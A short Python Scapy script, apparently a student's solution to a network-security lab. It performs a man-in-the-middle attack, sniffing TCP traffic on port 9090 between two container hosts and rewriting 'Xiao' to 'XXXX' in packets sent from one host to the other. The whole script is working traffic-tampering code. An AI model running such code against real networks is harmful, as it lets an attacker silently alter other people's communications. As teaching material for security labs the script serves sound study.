#!/usr/bin/env python3
from scapy.all import *
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

# function to spoof packets
def spoof_pkt(pkt):
    #get packet send form HostA (client)
    if pkt[IP].src==IP_A and pkt[IP].dst==IP_B:
        newpkt=IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        #################################################################
        # Construct the new payload based on the old payload.
        # Students need to implement this part.
        if pkt[TCP].payload:
            data=pkt[TCP].payload.load
            newdata=data.replace(b"Xiao",b"XXXX")
            send(newpkt/newdata)# send back to A 
        else: # if the original packet doesn't have a TCP payload,send as its
            send(newpkt)
    elif pkt[IP].src==IP_B and pkt[IP].dst==IP_A: # packet from server don't change anything
        newpkt=IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)
f='tcp and port 9090 and (ether src 02:42:0a:09:00:05 or ether src 02:42:0a:09:00:06)'# change the filter

pkt=sniff(iface='eth0',filter=f,prn=spoof_pkt)

